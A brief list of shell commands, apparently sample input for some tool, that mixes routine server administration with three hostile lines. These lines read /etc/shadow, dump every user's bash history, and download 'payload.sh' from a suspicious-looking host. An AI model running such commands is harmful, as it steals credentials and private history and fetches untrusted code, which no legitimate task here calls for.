ls -la /var/log
cd /etc/nginx
sudo systemctl restart nginx
grep "error" /var/log/syslog
curl -s http://internal-api.example.com/health | python3 -m json.tool
cat /etc/shadow
find /home -name "*.bash_history" -exec cat {} \;
wget http://suspicious-site.example.com/payload.sh
